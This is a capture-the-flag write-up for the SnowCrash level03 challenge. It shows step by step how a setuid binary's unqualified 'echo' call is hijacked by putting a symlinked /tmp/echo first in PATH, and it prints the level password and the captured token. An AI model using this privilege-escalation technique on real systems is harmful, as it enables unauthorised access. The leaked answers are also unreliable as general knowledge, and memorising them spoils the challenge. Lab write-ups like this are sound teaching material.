# Level 03 : found flag03

```bash
flag02@SnowCrash:~$ su level03
Password: kooda2puivaav1idi4f57q8iq
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```

We saw that there is an executable with the rights of `flag03`.

```
3@SnowCrash:~$ cat level03
[..]
...O����[�/usr/bin/env echo Exploit me;0p�...
[..]
```
The part who wrote `Exploit me` is the echo command, with `/usr/bin/env` before.

`/usr/bin/env` is to define that the command after will be found in the `PATH`.
```bash
3@SnowCrash:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

So as we have write righ in `/tmp` we can create an symbolic link of `getflag` in `/tmp` as `/tmp/echo`, then add `/tmp` to the `PATH` environnement.

```bash
level03@SnowCrash:~$ which getflag
/bin/getflag
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

Then we just have to launch the executable.

```bash
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

****************************************

Documentations :
* https://vi.stackexchange.com/questions/2232/how-can-i-use-vim-as-a-hex-editor
* https://vim.fandom.com/wiki/Improved_hex_editing
* https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code